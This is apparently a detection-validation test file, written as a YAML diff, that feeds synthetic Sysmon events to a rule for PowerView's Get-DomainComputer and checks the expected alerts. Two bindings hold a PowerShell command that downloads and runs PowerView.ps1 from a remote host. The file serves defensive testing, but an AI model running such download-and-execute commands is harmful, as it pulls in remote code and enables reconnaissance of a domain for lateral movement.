@@ -1,0 +1,56 @@
+type: job
+name: GetDomainComputer with PowerShell
+detection:
+  source: escu
+  name: "ESCU - GetDomainComputer with PowerShell - Rule"
+  id: ed550c19-712e-43f6-bd19-6f58f61b3a5e
+description: |
+  Validates detection of PowerView's Get-DomainComputer being run to list every computer
+  object in the domain, which maps the hosts worth moving to next.
+  The rule scopes to powershell.exe only, so the cmd.exe wrapper that
+  launched it is a control rather than a second alert arm. A second control
+  runs Get-DomainSID, a toolkit sibling the rule does not name.
+
+mitre:
+  tactics: [discovery]
+  techniques: [T1018]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
+    bindings:
+      computer:     ref.computer
+      command_line: "powershell.exe  -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.16:8000/PowerView.ps1');Get-DomainComputer\""
+    expectation:
+      expected: alert
+      summary: "powershell.exe runs the cmdlet the rule names"
+      mitre:
+        tactics: [discovery]
+        techniques: [T1018]
+
+  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
+    bindings:
+      computer:            ref.computer
+      command_line:        "\"C:\\Windows\\system32\\cmd.exe\" /c powershell.exe -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.16:8000/PowerView.ps1');Get-DomainComputer\""
+      image:               "C:\\Windows\\System32\\cmd.exe"
+      original_file_name:  Cmd.Exe
+      host_description:    Windows Command Processor
+      file_version:        10.0.14393.0 (rs1_release.160715-1616)
+      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
+    expectation:
+      expected: none
+      summary: "The cmd.exe wrapper carries the same cmdlet but is not a shell the rule scopes to"
+
+  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
+    bindings:
+      computer: ref.computer
+      cmdlet:   Get-DomainSID
+    expectation:
+      expected: none
+      summary: "A sibling cmdlet the rule does not name"
